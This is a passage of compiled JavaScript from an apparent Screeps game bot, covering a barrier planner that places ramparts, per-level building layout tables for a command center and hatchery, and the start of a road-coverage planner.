                return !!this.memory.barrierLookup[pos.coordName] || pos.getRangeTo(this.colony.controller) == 1;
            }
        }
        else {
            return !!this.memory.barrierLookup[pos.coordName] || pos.getRangeTo(this.colony.controller) == 1;
        }
    }
    /* Create construction sites for any buildings that need to be built */
    buildMissingRamparts() {
        // Max buildings that can be placed each tick
        let count = RoomPlanner.settings.maxSitesPerColony - this.colony.constructionSites.length;
        // Build missing ramparts
        const barrierPositions = [];
        for (const coord of _.keys(this.memory.barrierLookup)) {
            barrierPositions.push(derefCoords(coord, this.colony.name));
        }
        // Add critical structures to barrier lookup
        const criticalStructures = _.compact([...this.colony.towers,
            ...this.colony.spawns,
            this.colony.storage,
            this.colony.terminal]);
        for (const structure of criticalStructures) {
            barrierPositions.push(structure.pos);
        }
        for (const pos of barrierPositions) {
            if (count > 0 && RoomPlanner.canBuild(STRUCTURE_RAMPART, pos) && this.barrierShouldBeHere(pos)) {
                const ret = pos.createConstructionSite(STRUCTURE_RAMPART);
                if (ret != OK) {
                    log.warning(`${this.colony.name}: couldn't create rampart site at ${pos.print}. Result: ${ret}`);
                }
                else {
                    count--;
                }
            }
        }
    }
    buildMissingBunkerRamparts() {
        if (!this.roomPlanner.bunkerPos)
            return;
        const bunkerCoords = getAllStructureCoordsFromLayout(bunkerLayout, this.colony.level);
        bunkerCoords.push(bunkerLayout.data.anchor); // add center bunker tile
        let bunkerPositions = _.map(bunkerCoords, coord => new RoomPosition(coord.x, coord.y, this.colony.name));
        bunkerPositions = translatePositions(bunkerPositions, bunkerLayout.data.anchor, this.roomPlanner.bunkerPos);
        let count = RoomPlanner.settings.maxSitesPerColony - this.colony.constructionSites.length;
        for (const pos of bunkerPositions) {
            if (count > 0 && !pos.lookForStructure(STRUCTURE_RAMPART)
                && pos.lookFor(LOOK_CONSTRUCTION_SITES).length == 0) {
                const ret = pos.createConstructionSite(STRUCTURE_RAMPART);
                if (ret != OK) {
                    log.warning(`${this.colony.name}: couldn't create bunker rampart at ${pos.print}. Result: ${ret}`);
                }
                else {
                    count--;
                }
            }
        }
    }
    run() {
        if (this.roomPlanner.active) {
            if (this.roomPlanner.bunkerPos) {
                this.barrierPositions = this.computeBunkerBarrierPositions(this.roomPlanner.bunkerPos, this.colony.controller.pos);
            }
            else if (this.roomPlanner.storagePos && this.roomPlanner.hatcheryPos) {
                this.barrierPositions = this.computeBarrierPositions(this.roomPlanner.hatcheryPos, this.roomPlanner.storagePos, this.colony.controller.pos);
            }
            this.visuals();
        }
        else {
            if (!this.roomPlanner.memory.relocating && this.colony.level >= BarrierPlanner_1.settings.buildBarriersAtRCL
                && this.roomPlanner.shouldRecheck(2)) {
                this.buildMissingRamparts();
                if (this.colony.layout == 'bunker' && this.colony.level >= 7) {
                    this.buildMissingBunkerRamparts();
                }
            }
        }
    }
    visuals() {
        for (const pos of this.barrierPositions) {
            this.colony.room.visual.structure(pos.x, pos.y, STRUCTURE_RAMPART);
        }
    }
};
BarrierPlanner.settings = {
    buildBarriersAtRCL: 3,
    padding: 3,
    bunkerizeRCL: 7
};
BarrierPlanner = BarrierPlanner_1 = __decorate([
    profile
], BarrierPlanner);

/* tslint:disable */
// @formatter:off
var commandCenterLayout = { data: { anchor: { 'x': 25, 'y': 25 } }, 3: { 'name': 'commandCenter', 'shard': 'shard0', 'rcl': '3', 'buildings': { 'tower': { 'pos': [{ 'x': 24, 'y': 27 }] } } }, 4: { 'name': 'commandCenter', 'shard': 'shard0', 'rcl': '4', 'buildings': { 'road': { 'pos': [{ 'x': 21, 'y': 24 }, { 'x': 22, 'y': 24 }, { 'x': 23, 'y': 24 }, { 'x': 24, 'y': 24 }, { 'x': 25, 'y': 24 }, { 'x': 26, 'y': 24 }, { 'x': 21, 'y': 25 }, { 'x': 26, 'y': 25 }, { 'x': 21, 'y': 26 }, { 'x': 23, 'y': 26 }, { 'x': 24, 'y': 26 }, { 'x': 26, 'y': 26 }, { 'x': 21, 'y': 27 }, { 'x': 22, 'y': 27 }, { 'x': 25, 'y': 27 }, { 'x': 26, 'y': 27 }, { 'x': 21, 'y': 28 }, { 'x': 22, 'y': 28 }, { 'x': 25, 'y': 28 }, { 'x': 26, 'y': 28 }, { 'x': 21, 'y': 29 }, { 'x': 26, 'y': 29 }, { 'x': 21, 'y': 30 }, { 'x': 26, 'y': 30 }, { 'x': 21, 'y': 31 }, { 'x': 22, 'y': 31 }, { 'x': 23, 'y': 31 }, { 'x': 24, 'y': 31 }, { 'x': 25, 'y': 31 }, { 'x': 26, 'y': 31 }] }, 'storage': { 'pos': [{ 'x': 25, 'y': 25 }] }, 'tower': { 'pos': [{ 'x': 24, 'y': 27 }] } } }, 5: { 'name': 'commandCenter', 'shard': 'shard0', 'rcl': '5', 'buildings': { 'road': { 'pos': [{ 'x': 21, 'y': 24 }, { 'x': 22, 'y': 24 }, { 'x': 23, 'y': 24 }, { 'x': 24, 'y': 24 }, { 'x': 25, 'y': 24 }, { 'x': 26, 'y': 24 }, { 'x': 21, 'y': 25 }, { 'x': 26, 'y': 25 }, { 'x': 21, 'y': 26 }, { 'x': 23, 'y': 26 }, { 'x': 24, 'y': 26 }, { 'x': 26, 'y': 26 }, { 'x': 21, 'y': 27 }, { 'x': 22, 'y': 27 }, { 'x': 25, 'y': 27 }, { 'x': 26, 'y': 27 }, { 'x': 21, 'y': 28 }, { 'x': 22, 'y': 28 }, { 'x': 25, 'y': 28 }, { 'x': 26, 'y': 28 }, { 'x': 21, 'y': 29 }, { 'x': 26, 'y': 29 }, { 'x': 21, 'y': 30 }, { 'x': 26, 'y': 30 }, { 'x': 21, 'y': 31 }, { 'x': 22, 'y': 31 }, { 'x': 23, 'y': 31 }, { 'x': 24, 'y': 31 }, { 'x': 25, 'y': 31 }, { 'x': 26, 'y': 31 }] }, 'link': { 'pos': [{ 'x': 24, 'y': 25 }] }, 'storage': { 'pos': [{ 'x': 25, 'y': 25 }] }, 'tower': { 'pos': [{ 'x': 24, 'y': 27 }] } } }, 6: { 'name': 'commandCenter', 'shard': 'shard0', 'rcl': '6', 'buildings': { 'road': { 'pos': [{ 'x': 21, 'y': 24 }, { 'x': 22, 'y': 24 }, { 'x': 23, 'y': 24 }, { 'x': 24, 'y': 24 }, { 'x': 25, 'y': 24 }, { 'x': 26, 'y': 24 }, { 'x': 21, 'y': 25 }, { 'x': 26, 'y': 25 }, { 'x': 21, 'y': 26 }, { 'x': 23, 'y': 26 }, { 'x': 24, 'y': 26 }, { 'x': 26, 'y': 26 }, { 'x': 21, 'y': 27 }, { 'x': 22, 'y': 27 }, { 'x': 25, 'y': 27 }, { 'x': 26, 'y': 27 }, { 'x': 21, 'y': 28 }, { 'x': 22, 'y': 28 }, { 'x': 25, 'y': 28 }, { 'x': 26, 'y': 28 }, { 'x': 21, 'y': 29 }, { 'x': 26, 'y': 29 }, { 'x': 21, 'y': 30 }, { 'x': 26, 'y': 30 }, { 'x': 21, 'y': 31 }, { 'x': 22, 'y': 31 }, { 'x': 23, 'y': 31 }, { 'x': 24, 'y': 31 }, { 'x': 25, 'y': 31 }, { 'x': 26, 'y': 31 }] }, 'link': { 'pos': [{ 'x': 24, 'y': 25 }] }, 'storage': { 'pos': [{ 'x': 25, 'y': 25 }] }, 'terminal': { 'pos': [{ 'x': 25, 'y': 26 }] }, 'tower': { 'pos': [{ 'x': 24, 'y': 27 }] }, 'lab': { 'pos': [{ 'x': 23, 'y': 28 }, { 'x': 24, 'y': 28 }, { 'x': 24, 'y': 29 }] } } }, 7: { 'name': 'commandCenter', 'shard': 'shard0', 'rcl': '7', 'buildings': { 'road': { 'pos': [{ 'x': 21, 'y': 24 }, { 'x': 22, 'y': 24 }, { 'x': 23, 'y': 24 }, { 'x': 24, 'y': 24 }, { 'x': 25, 'y': 24 }, { 'x': 26, 'y': 24 }, { 'x': 21, 'y': 25 }, { 'x': 26, 'y': 25 }, { 'x': 21, 'y': 26 }, { 'x': 23, 'y': 26 }, { 'x': 24, 'y': 26 }, { 'x': 26, 'y': 26 }, { 'x': 21, 'y': 27 }, { 'x': 22, 'y': 27 }, { 'x': 25, 'y': 27 }, { 'x': 26, 'y': 27 }, { 'x': 21, 'y': 28 }, { 'x': 22, 'y': 28 }, { 'x': 25, 'y': 28 }, { 'x': 26, 'y': 28 }, { 'x': 21, 'y': 29 }, { 'x': 26, 'y': 29 }, { 'x': 21, 'y': 30 }, { 'x': 26, 'y': 30 }, { 'x': 21, 'y': 31 }, { 'x': 22, 'y': 31 }, { 'x': 23, 'y': 31 }, { 'x': 24, 'y': 31 }, { 'x': 25, 'y': 31 }, { 'x': 26, 'y': 31 }] }, 'link': { 'pos': [{ 'x': 24, 'y': 25 }] }, 'storage': { 'pos': [{ 'x': 25, 'y': 25 }] }, 'terminal': { 'pos': [{ 'x': 25, 'y': 26 }] }, 'tower': { 'pos': [{ 'x': 23, 'y': 27 }, { 'x': 24, 'y': 27 }] }, 'lab': { 'pos': [{ 'x': 23, 'y': 28 }, { 'x': 24, 'y': 28 }, { 'x': 22, 'y': 29 }, { 'x': 23, 'y': 29 }, { 'x': 24, 'y': 29 }, { 'x': 25, 'y': 29 }] } } }, 8: { 'name': 'commandCenter', 'shard': 'shard0', 'rcl': '8', 'buildings': { 'road': { 'pos': [{ 'x': 21, 'y': 24 }, { 'x': 22, 'y': 24 }, { 'x': 23, 'y': 24 }, { 'x': 24, 'y': 24 }, { 'x': 25, 'y': 24 }, { 'x': 26, 'y': 24 }, { 'x': 21, 'y': 25 }, { 'x': 26, 'y': 25 }, { 'x': 21, 'y': 26 }, { 'x': 23, 'y': 26 }, { 'x': 24, 'y': 26 }, { 'x': 26, 'y': 26 }, { 'x': 21, 'y': 27 }, { 'x': 22, 'y': 27 }, { 'x': 25, 'y': 27 }, { 'x': 26, 'y': 27 }, { 'x': 21, 'y': 28 }, { 'x': 22, 'y': 28 }, { 'x': 25, 'y': 28 }, { 'x': 26, 'y': 28 }, { 'x': 21, 'y': 29 }, { 'x': 26, 'y': 29 }, { 'x': 21, 'y': 30 }, { 'x': 26, 'y': 30 }, { 'x': 21, 'y': 31 }, { 'x': 22, 'y': 31 }, { 'x': 23, 'y': 31 }, { 'x': 24, 'y': 31 }, { 'x': 25, 'y': 31 }, { 'x': 26, 'y': 31 }] }, 'nuker': { 'pos': [{ 'x': 22, 'y': 25 }] }, 'powerSpawn': { 'pos': [{ 'x': 23, 'y': 25 }] }, 'link': { 'pos': [{ 'x': 24, 'y': 25 }] }, 'storage': { 'pos': [{ 'x': 25, 'y': 25 }] }, 'observer': { 'pos': [{ 'x': 22, 'y': 26 }] }, 'terminal': { 'pos': [{ 'x': 25, 'y': 26 }] }, 'tower': { 'pos': [{ 'x': 23, 'y': 27 }, { 'x': 24, 'y': 27 }] }, 'lab': { 'pos': [{ 'x': 23, 'y': 28 }, { 'x': 24, 'y': 28 }, { 'x': 22, 'y': 29 }, { 'x': 23, 'y': 29 }, { 'x': 24, 'y': 29 }, { 'x': 25, 'y': 29 }, { 'x': 22, 'y': 30 }, { 'x': 23, 'y': 30 }, { 'x': 24, 'y': 30 }, { 'x': 25, 'y': 30 }] } } }, };

/* tslint:disable */
// @formatter:off
var hatcheryLayout = { data: { anchor: { 'x': 25, 'y': 24 }, }, 1: { 'name': 'hatchery', 'shard': 'shard0', 'rcl': '1', 'buildings': { 'spawn': { 'pos': [{ 'x': 25, 'y': 24 }] } } }, 2: { 'name': 'hatchery', 'shard': 'shard0', 'rcl': '2', 'buildings': { 'extension': { 'pos': [{ 'x': 24, 'y': 23 }, { 'x': 26, 'y': 23 }, { 'x': 23, 'y': 24 }, { 'x': 27, 'y': 24 }, { 'x': 27, 'y': 26 }] }, 'spawn': { 'pos': [{ 'x': 25, 'y': 24 }] }, 'container': { 'pos': [{ 'x': 25, 'y': 25 }] } } }, 3: { 'name': 'hatchery', 'shard': 'shard0', 'rcl': '3', 'buildings': { 'extension': { 'pos': [{ 'x': 24, 'y': 22 }, { 'x': 26, 'y': 22 }, { 'x': 24, 'y': 23 }, { 'x': 26, 'y': 23 }, { 'x': 23, 'y': 24 }, { 'x': 27, 'y': 24 }, { 'x': 23, 'y': 26 }, { 'x': 27, 'y': 26 }, { 'x': 24, 'y': 27 }, { 'x': 26, 'y': 27 }] }, 'spawn': { 'pos': [{ 'x': 25, 'y': 24 }] }, 'container': { 'pos': [{ 'x': 25, 'y': 25 }] } } }, 4: { 'name': 'hatchery', 'shard': 'shard0', 'rcl': '4', 'buildings': { 'road': { 'pos': [{ 'x': 25, 'y': 25 }, { 'x': 25, 'y': 20 }, { 'x': 21, 'y': 21 }, { 'x': 24, 'y': 21 }, { 'x': 26, 'y': 21 }, { 'x': 29, 'y': 21 }, { 'x': 22, 'y': 22 }, { 'x': 25, 'y': 22 }, { 'x': 28, 'y': 22 }, { 'x': 23, 'y': 23 }, { 'x': 25, 'y': 23 }, { 'x': 27, 'y': 23 }, { 'x': 21, 'y': 24 }, { 'x': 24, 'y': 24 }, { 'x': 26, 'y': 24 }, { 'x': 29, 'y': 24 }, { 'x': 20, 'y': 25 }, { 'x': 22, 'y': 25 }, { 'x': 23, 'y': 25 }, { 'x': 27, 'y': 25 }, { 'x': 28, 'y': 25 }, { 'x': 30, 'y': 25 }, { 'x': 21, 'y': 26 }, { 'x': 24, 'y': 26 }, { 'x': 26, 'y': 26 }, { 'x': 29, 'y': 26 }, { 'x': 23, 'y': 27 }, { 'x': 25, 'y': 27 }, { 'x': 27, 'y': 27 }, { 'x': 22, 'y': 28 }, { 'x': 25, 'y': 28 }, { 'x': 28, 'y': 28 }, { 'x': 21, 'y': 29 }, { 'x': 24, 'y': 29 }, { 'x': 26, 'y': 29 }, { 'x': 29, 'y': 29 }, { 'x': 25, 'y': 30 }] }, 'extension': { 'pos': [{ 'x': 23, 'y': 22 }, { 'x': 24, 'y': 22 }, { 'x': 26, 'y': 22 }, { 'x': 27, 'y': 22 }, { 'x': 24, 'y': 23 }, { 'x': 26, 'y': 23 }, { 'x': 22, 'y': 24 }, { 'x': 23, 'y': 24 }, { 'x': 27, 'y': 24 }, { 'x': 28, 'y': 24 }, { 'x': 22, 'y': 26 }, { 'x': 23, 'y': 26 }, { 'x': 27, 'y': 26 }, { 'x': 28, 'y': 26 }, { 'x': 24, 'y': 27 }, { 'x': 26, 'y': 27 }, { 'x': 23, 'y': 28 }, { 'x': 24, 'y': 28 }, { 'x': 26, 'y': 28 }, { 'x': 27, 'y': 28 }] }, 'spawn': { 'pos': [{ 'x': 25, 'y': 24 }] }, 'container': { 'pos': [{ 'x': 25, 'y': 25 }] } } }, 5: { 'name': 'hatchery', 'shard': 'shard0', 'rcl': '5', 'buildings': { 'road': { 'pos': [{ 'x': 25, 'y': 25 }, { 'x': 25, 'y': 20 }, { 'x': 21, 'y': 21 }, { 'x': 24, 'y': 21 }, { 'x': 26, 'y': 21 }, { 'x': 29, 'y': 21 }, { 'x': 22, 'y': 22 }, { 'x': 25, 'y': 22 }, { 'x': 28, 'y': 22 }, { 'x': 23, 'y': 23 }, { 'x': 25, 'y': 23 }, { 'x': 27, 'y': 23 }, { 'x': 21, 'y': 24 }, { 'x': 24, 'y': 24 }, { 'x': 26, 'y': 24 }, { 'x': 29, 'y': 24 }, { 'x': 20, 'y': 25 }, { 'x': 22, 'y': 25 }, { 'x': 23, 'y': 25 }, { 'x': 27, 'y': 25 }, { 'x': 28, 'y': 25 }, { 'x': 30, 'y': 25 }, { 'x': 21, 'y': 26 }, { 'x': 24, 'y': 26 }, { 'x': 26, 'y': 26 }, { 'x': 29, 'y': 26 }, { 'x': 23, 'y': 27 }, { 'x': 25, 'y': 27 }, { 'x': 27, 'y': 27 }, { 'x': 22, 'y': 28 }, { 'x': 25, 'y': 28 }, { 'x': 28, 'y': 28 }, { 'x': 21, 'y': 29 }, { 'x': 24, 'y': 29 }, { 'x': 26, 'y': 29 }, { 'x': 29, 'y': 29 }, { 'x': 25, 'y': 30 }] }, 'extension': { 'pos': [{ 'x': 23, 'y': 21 }, { 'x': 27, 'y': 21 }, { 'x': 23, 'y': 22 }, { 'x': 24, 'y': 22 }, { 'x': 26, 'y': 22 }, { 'x': 27, 'y': 22 }, { 'x': 21, 'y': 23 }, { 'x': 22, 'y': 23 }, { 'x': 24, 'y': 23 }, { 'x': 26, 'y': 23 }, { 'x': 28, 'y': 23 }, { 'x': 29, 'y': 23 }, { 'x': 22, 'y': 24 }, { 'x': 23, 'y': 24 }, { 'x': 27, 'y': 24 }, { 'x': 28, 'y': 24 }, { 'x': 22, 'y': 26 }, { 'x': 23, 'y': 26 }, { 'x': 27, 'y': 26 }, { 'x': 28, 'y': 26 }, { 'x': 22, 'y': 27 }, { 'x': 24, 'y': 27 }, { 'x': 26, 'y': 27 }, { 'x': 28, 'y': 27 }, { 'x': 29, 'y': 27 }, { 'x': 23, 'y': 28 }, { 'x': 24, 'y': 28 }, { 'x': 26, 'y': 28 }, { 'x': 27, 'y': 28 }, { 'x': 27, 'y': 29 }] }, 'spawn': { 'pos': [{ 'x': 25, 'y': 24 }] }, 'container': { 'pos': [{ 'x': 25, 'y': 25 }] }, 'tower': { 'pos': [{ 'x': 29, 'y': 25 }] }, 'link': { 'pos': [{ 'x': 25, 'y': 26 }] } } }, 6: { 'name': 'hatchery', 'shard': 'shard0', 'rcl': '6', 'buildings': { 'road': { 'pos': [{ 'x': 25, 'y': 25 }, { 'x': 25, 'y': 20 }, { 'x': 21, 'y': 21 }, { 'x': 24, 'y': 21 }, { 'x': 26, 'y': 21 }, { 'x': 29, 'y': 21 }, { 'x': 22, 'y': 22 }, { 'x': 25, 'y': 22 }, { 'x': 28, 'y': 22 }, { 'x': 23, 'y': 23 }, { 'x': 25, 'y': 23 }, { 'x': 27, 'y': 23 }, { 'x': 21, 'y': 24 }, { 'x': 24, 'y': 24 }, { 'x': 26, 'y': 24 }, { 'x': 29, 'y': 24 }, { 'x': 20, 'y': 25 }, { 'x': 22, 'y': 25 }, { 'x': 23, 'y': 25 }, { 'x': 27, 'y': 25 }, { 'x': 28, 'y': 25 }, { 'x': 30, 'y': 25 }, { 'x': 21, 'y': 26 }, { 'x': 24, 'y': 26 }, { 'x': 26, 'y': 26 }, { 'x': 29, 'y': 26 }, { 'x': 23, 'y': 27 }, { 'x': 25, 'y': 27 }, { 'x': 27, 'y': 27 }, { 'x': 22, 'y': 28 }, { 'x': 25, 'y': 28 }, { 'x': 28, 'y': 28 }, { 'x': 21, 'y': 29 }, { 'x': 24, 'y': 29 }, { 'x': 26, 'y': 29 }, { 'x': 29, 'y': 29 }, { 'x': 25, 'y': 30 }] }, 'extension': { 'pos': [{ 'x': 22, 'y': 21 }, { 'x': 23, 'y': 21 }, { 'x': 27, 'y': 21 }, { 'x': 28, 'y': 21 }, { 'x': 21, 'y': 22 }, { 'x': 23, 'y': 22 }, { 'x': 24, 'y': 22 }, { 'x': 26, 'y': 22 }, { 'x': 27, 'y': 22 }, { 'x': 29, 'y': 22 }, { 'x': 21, 'y': 23 }, { 'x': 22, 'y': 23 }, { 'x': 24, 'y': 23 }, { 'x': 26, 'y': 23 }, { 'x': 28, 'y': 23 }, { 'x': 29, 'y': 23 }, { 'x': 22, 'y': 24 }, { 'x': 23, 'y': 24 }, { 'x': 27, 'y': 24 }, { 'x': 28, 'y': 24 }, { 'x': 22, 'y': 26 }, { 'x': 23, 'y': 26 }, { 'x': 27, 'y': 26 }, { 'x': 28, 'y': 26 }, { 'x': 21, 'y': 27 }, { 'x': 22, 'y': 27 }, { 'x': 24, 'y': 27 }, { 'x': 26, 'y': 27 }, { 'x': 28, 'y': 27 }, { 'x': 29, 'y': 27 }, { 'x': 21, 'y': 28 }, { 'x': 23, 'y': 28 }, { 'x': 24, 'y': 28 }, { 'x': 26, 'y': 28 }, { 'x': 27, 'y': 28 }, { 'x': 29, 'y': 28 }, { 'x': 22, 'y': 29 }, { 'x': 23, 'y': 29 }, { 'x': 27, 'y': 29 }, { 'x': 28, 'y': 29 }] }, 'spawn': { 'pos': [{ 'x': 25, 'y': 24 }] }, 'container': { 'pos': [{ 'x': 25, 'y': 25 }] }, 'tower': { 'pos': [{ 'x': 29, 'y': 25 }] }, 'link': { 'pos': [{ 'x': 25, 'y': 26 }] } } }, 7: { 'name': 'hatchery', 'shard': 'shard0', 'rcl': '7', 'buildings': { 'extension': { 'pos': [{ 'x': 21, 'y': 20 }, { 'x': 22, 'y': 20 }, { 'x': 28, 'y': 20 }, { 'x': 29, 'y': 20 }, { 'x': 20, 'y': 21 }, { 'x': 22, 'y': 21 }, { 'x': 23, 'y': 21 }, { 'x': 27, 'y': 21 }, { 'x': 28, 'y': 21 }, { 'x': 30, 'y': 21 }, { 'x': 20, 'y': 22 }, { 'x': 21, 'y': 22 }, { 'x': 23, 'y': 22 }, { 'x': 24, 'y': 22 }, { 'x': 26, 'y': 22 }, { 'x': 27, 'y': 22 }, { 'x': 29, 'y': 22 }, { 'x': 30, 'y': 22 }, { 'x': 21, 'y': 23 }, { 'x': 22, 'y': 23 }, { 'x': 24, 'y': 23 }, { 'x': 26, 'y': 23 }, { 'x': 28, 'y': 23 }, { 'x': 29, 'y': 23 }, { 'x': 22, 'y': 24 }, { 'x': 23, 'y': 24 }, { 'x': 27, 'y': 24 }, { 'x': 28, 'y': 24 }, { 'x': 22, 'y': 26 }, { 'x': 23, 'y': 26 }, { 'x': 27, 'y': 26 }, { 'x': 28, 'y': 26 }, { 'x': 21, 'y': 27 }, { 'x': 22, 'y': 27 }, { 'x': 24, 'y': 27 }, { 'x': 26, 'y': 27 }, { 'x': 28, 'y': 27 }, { 'x': 29, 'y': 27 }, { 'x': 21, 'y': 28 }, { 'x': 23, 'y': 28 }, { 'x': 24, 'y': 28 }, { 'x': 26, 'y': 28 }, { 'x': 27, 'y': 28 }, { 'x': 29, 'y': 28 }, { 'x': 20, 'y': 29 }, { 'x': 22, 'y': 29 }, { 'x': 23, 'y': 29 }, { 'x': 27, 'y': 29 }, { 'x': 28, 'y': 29 }, { 'x': 30, 'y': 29 }] }, 'road': { 'pos': [{ 'x': 25, 'y': 25 }, { 'x': 25, 'y': 20 }, { 'x': 21, 'y': 21 }, { 'x': 24, 'y': 21 }, { 'x': 26, 'y': 21 }, { 'x': 29, 'y': 21 }, { 'x': 22, 'y': 22 }, { 'x': 25, 'y': 22 }, { 'x': 28, 'y': 22 }, { 'x': 23, 'y': 23 }, { 'x': 25, 'y': 23 }, { 'x': 27, 'y': 23 }, { 'x': 21, 'y': 24 }, { 'x': 24, 'y': 24 }, { 'x': 26, 'y': 24 }, { 'x': 29, 'y': 24 }, { 'x': 20, 'y': 25 }, { 'x': 22, 'y': 25 }, { 'x': 23, 'y': 25 }, { 'x': 27, 'y': 25 }, { 'x': 28, 'y': 25 }, { 'x': 30, 'y': 25 }, { 'x': 21, 'y': 26 }, { 'x': 24, 'y': 26 }, { 'x': 26, 'y': 26 }, { 'x': 29, 'y': 26 }, { 'x': 23, 'y': 27 }, { 'x': 25, 'y': 27 }, { 'x': 27, 'y': 27 }, { 'x': 22, 'y': 28 }, { 'x': 25, 'y': 28 }, { 'x': 28, 'y': 28 }, { 'x': 21, 'y': 29 }, { 'x': 24, 'y': 29 }, { 'x': 26, 'y': 29 }, { 'x': 29, 'y': 29 }, { 'x': 25, 'y': 30 }] }, 'spawn': { 'pos': [{ 'x': 25, 'y': 24 }, { 'x': 24, 'y': 25 }] }, 'tower': { 'pos': [{ 'x': 29, 'y': 25 }] }, 'container': { 'pos': [{ 'x': 25, 'y': 25 }] }, 'link': { 'pos': [{ 'x': 25, 'y': 26 }] } } }, 8: { 'name': 'hatchery', 'shard': 'shard0', 'rcl': '8', 'buildings': { 'extension': { 'pos': [{ 'x': 20, 'y': 20 }, { 'x': 21, 'y': 20 }, { 'x': 22, 'y': 20 }, { 'x': 28, 'y': 20 }, { 'x': 29, 'y': 20 }, { 'x': 30, 'y': 20 }, { 'x': 20, 'y': 21 }, { 'x': 22, 'y': 21 }, { 'x': 23, 'y': 21 }, { 'x': 27, 'y': 21 }, { 'x': 28, 'y': 21 }, { 'x': 30, 'y': 21 }, { 'x': 20, 'y': 22 }, { 'x': 21, 'y': 22 }, { 'x': 23, 'y': 22 }, { 'x': 24, 'y': 22 }, { 'x': 26, 'y': 22 }, { 'x': 27, 'y': 22 }, { 'x': 29, 'y': 22 }, { 'x': 30, 'y': 22 }, { 'x': 21, 'y': 23 }, { 'x': 22, 'y': 23 }, { 'x': 24, 'y': 23 }, { 'x': 26, 'y': 23 }, { 'x': 28, 'y': 23 }, { 'x': 29, 'y': 23 }, { 'x': 22, 'y': 24 }, { 'x': 23, 'y': 24 }, { 'x': 27, 'y': 24 }, { 'x': 28, 'y': 24 }, { 'x': 22, 'y': 26 }, { 'x': 23, 'y': 26 }, { 'x': 27, 'y': 26 }, { 'x': 28, 'y': 26 }, { 'x': 21, 'y': 27 }, { 'x': 22, 'y': 27 }, { 'x': 24, 'y': 27 }, { 'x': 26, 'y': 27 }, { 'x': 28, 'y': 27 }, { 'x': 29, 'y': 27 }, { 'x': 20, 'y': 28 }, { 'x': 21, 'y': 28 }, { 'x': 23, 'y': 28 }, { 'x': 24, 'y': 28 }, { 'x': 26, 'y': 28 }, { 'x': 27, 'y': 28 }, { 'x': 29, 'y': 28 }, { 'x': 30, 'y': 28 }, { 'x': 20, 'y': 29 }, { 'x': 22, 'y': 29 }, { 'x': 23, 'y': 29 }, { 'x': 27, 'y': 29 }, { 'x': 28, 'y': 29 }, { 'x': 30, 'y': 29 }, { 'x': 20, 'y': 30 }, { 'x': 21, 'y': 30 }, { 'x': 22, 'y': 30 }, { 'x': 28, 'y': 30 }, { 'x': 29, 'y': 30 }, { 'x': 30, 'y': 30 }] }, 'road': { 'pos': [{ 'x': 25, 'y': 25 }, { 'x': 25, 'y': 20 }, { 'x': 21, 'y': 21 }, { 'x': 24, 'y': 21 }, { 'x': 26, 'y': 21 }, { 'x': 29, 'y': 21 }, { 'x': 22, 'y': 22 }, { 'x': 25, 'y': 22 }, { 'x': 28, 'y': 22 }, { 'x': 23, 'y': 23 }, { 'x': 25, 'y': 23 }, { 'x': 27, 'y': 23 }, { 'x': 21, 'y': 24 }, { 'x': 24, 'y': 24 }, { 'x': 26, 'y': 24 }, { 'x': 29, 'y': 24 }, { 'x': 20, 'y': 25 }, { 'x': 22, 'y': 25 }, { 'x': 23, 'y': 25 }, { 'x': 27, 'y': 25 }, { 'x': 28, 'y': 25 }, { 'x': 30, 'y': 25 }, { 'x': 21, 'y': 26 }, { 'x': 24, 'y': 26 }, { 'x': 26, 'y': 26 }, { 'x': 29, 'y': 26 }, { 'x': 23, 'y': 27 }, { 'x': 25, 'y': 27 }, { 'x': 27, 'y': 27 }, { 'x': 22, 'y': 28 }, { 'x': 25, 'y': 28 }, { 'x': 28, 'y': 28 }, { 'x': 21, 'y': 29 }, { 'x': 24, 'y': 29 }, { 'x': 26, 'y': 29 }, { 'x': 29, 'y': 29 }, { 'x': 25, 'y': 30 }] }, 'tower': { 'pos': [{ 'x': 25, 'y': 21 }, { 'x': 21, 'y': 25 }, { 'x': 29, 'y': 25 }, { 'x': 25, 'y': 29 }] }, 'spawn': { 'pos': [{ 'x': 25, 'y': 24 }, { 'x': 24, 'y': 25 }, { 'x': 26, 'y': 25 }] }, 'container': { 'pos': [{ 'x': 25, 'y': 25 }] }, 'link': { 'pos': [{ 'x': 25, 'y': 26 }] } } }, };

var RoadPlanner_1;
const PLAIN_COST = 3;
const SWAMP_COST = 4;
const WALL_COST = 15 * PLAIN_COST;
const EXISTING_PATH_COST = PLAIN_COST - 1;
const memoryDefaults$1 = {
    roadLookup: {},
    roadCoverage: 0.0,
    roadCoverages: {}
};
let RoadPlanner = RoadPlanner_1 = class RoadPlanner {
    constructor(roomPlanner) {
        this.roomPlanner = roomPlanner;
        this.colony = roomPlanner.colony;
        this.memory = Mem.wrap(this.colony.memory, 'roadPlanner', memoryDefaults$1);
        this.costMatrices = {};
        this.roadPositions = [];
    }
    refresh() {
        this.memory = Mem.wrap(this.colony.memory, 'roadPlanner', memoryDefaults$1);
        this.costMatrices = {};
        this.roadPositions = [];
    }
    get roadCoverage() {
        return this.memory.roadCoverage;
    }
    recomputeRoadCoverages(storagePos) {
        // Compute coverage for each path
        for (const destination of this.colony.destinations) {
            const destName = destination.pos.name;
            if (!this.memory.roadCoverages[destName] || Game.time > this.memory.roadCoverages[destName].exp) {
                const roadCoverage = this.computeRoadCoverage(storagePos, destination.pos);
                if (roadCoverage != undefined) {
                    // Set expiration to be longer if road is nearly complete
                    const expiration = roadCoverage.roadCount / roadCoverage.length >= 0.75
                        ? getCacheExpiration(RoadPlanner_1.settings.recomputeCoverageInterval)
                        : getCacheExpiration(3 * RoadPlanner_1.settings.recomputeCoverageInterval);
                    this.memory.roadCoverages[destName] = {
                        roadCount: roadCoverage.roadCount,
                        length: roadCoverage.length,
                        exp: expiration
                    };
                }
                else {
                    if (this.memory.roadCoverages[destName]) {
                        // if you already have some data, use it for a little while
                        const waitTime = onPublicServer() ? 500 : 200;
                        this.memory.roadCoverages[destName].exp += waitTime;
                    }
                    else {
                        // otherwise put in a placeholder
                        const waitTime = onPublicServer() ? 300 : 100;
                        this.memory.roadCoverages[destName] = {
                            roadCount: 0,
                            length: 1,
                            exp: Game.time + waitTime
                        };
                    }
                }
                log.debug(`Recomputing road coverage from ${storagePos.print} to ${destination.pos.print}... ` +
                    `Coverage: ${JSON.stringify(roadCoverage)}`);
            }
        }
        // Store the aggregate roadCoverage score
        let totalRoadCount = 0;
        let totalPathLength = 0;
        for (const destName in this.memory.roadCoverages) {
            const { roadCount, length, exp } = this.memory.roadCoverages[destName];
            totalRoadCount += roadCount;
            totalPathLength += length;
        }
